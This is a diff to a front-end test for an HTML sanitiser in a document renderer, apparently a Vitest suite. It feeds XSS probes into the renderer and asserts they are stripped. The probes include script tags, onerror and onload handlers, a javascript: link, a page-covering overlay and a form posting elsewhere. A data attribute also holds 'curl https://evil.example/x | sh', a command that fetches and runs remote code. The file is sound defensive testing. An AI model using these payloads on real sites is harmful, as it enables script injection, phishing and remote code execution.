@@ -9,9 +9,7 @@ import large from "./fixtures/research-stage.md?raw";
 
 afterEach(() => (cleanup(), vi.unstubAllGlobals(), vi.restoreAllMocks(), window.history.pushState(null, "", "/")));
 
-test("a body's script, event handler and javascript: link never run: the sanitiser strips them", () => {
-  const alert = vi.fn();
-  vi.stubGlobal("alert", alert);
+test("a body's script, handler, style, form, data attribute and remote image never reach the page", () => {
   const body = [
     "## Probe",
     "<script>alert(1)</script>",
@@ -19,15 +17,29 @@ test("a body's script, event handler and javascript: link never run: the sanitis
     "[x](javascript:alert(3)) and <b>bold</b>",
     "<svg onload=alert(4)><circle r=1></circle></svg>",
     "| a <img src=y onerror=alert(5)> |\n|---|\n| <script>alert(6)</script> |",
+    "<p>x</p><style>body { display: none }</style>",
+    '<div style="position:fixed;inset:0;z-index:9999">fake page</div>',
+    '<form action="https://example.com"><input name="q"><button>go</button><textarea></textarea><select></select></form>',
+    '<div data-row="" data-command="curl https://evil.example/x | sh" tabindex="0" autofocus>a row</div>',
+    '<nav class="outline land">dressed as chrome</nav> <code class="language-sh">ls</code>',
+    '![remote](https://evil.example/pixel.png) ![inline](data:image/gif;base64,R0lGOD) ![here](/assets/a.png)',
   ].join("\n\n");
   render(<Document body={body} />);
-  expect(document.querySelector("script")).toBeNull();
-  expect(document.querySelectorAll(".prose img").length).toBe(2);
-  for (const img of document.querySelectorAll(".prose img")) expect(img.hasAttribute("onerror")).toBe(false);
-  expect(document.querySelector("[onload]")).toBeNull();
-  expect(document.querySelector('a[href^="javascript"]')).toBeNull();
-  expect(document.querySelector(".prose b")?.textContent).toBe("bold");
-  expect(alert).not.toHaveBeenCalled();
+  const prose = document.querySelector(".prose")!;
+  // Nothing runs: no script and no handler is left to run. happy-dom runs neither, so the proof is the markup.
+  expect(prose.querySelector("script")).toBeNull();
+  expect(prose.querySelector("[onerror], [onload]")).toBeNull();
+  expect(prose.querySelector('a[href^="javascript"]')).toBeNull();
+  expect(prose.querySelector("b")?.textContent).toBe("bold");
+  // Nothing restyles the page, posts, takes focus or dresses as its chrome (18, check 6).
+  expect(prose.querySelector("style, form, input, button, textarea, select")).toBeNull();
+  expect(prose.querySelector("[style], [tabindex], [autofocus]")).toBeNull();
+  expect(prose.querySelector("[data-row], [data-command]")).toBeNull();
+  expect(prose.querySelector(".outline, .land")).toBeNull();
+  expect(prose.querySelector("code.language-sh")?.textContent).toBe("ls");
+  // An image loads only from the page or a `data:` URL; a remote one reads as a link.
+  expect(Array.from(prose.querySelectorAll("img")).map((i) => i.getAttribute("alt"))).toEqual([null, null, "inline", "here"]);
+  expect(screen.getByRole("link", { name: "remote" }).getAttribute("href")).toBe("https://evil.example/pixel.png");
   expect(clean('<img src="x" onerror="alert(2)">')).toBe('<img src="x">');
 });
 
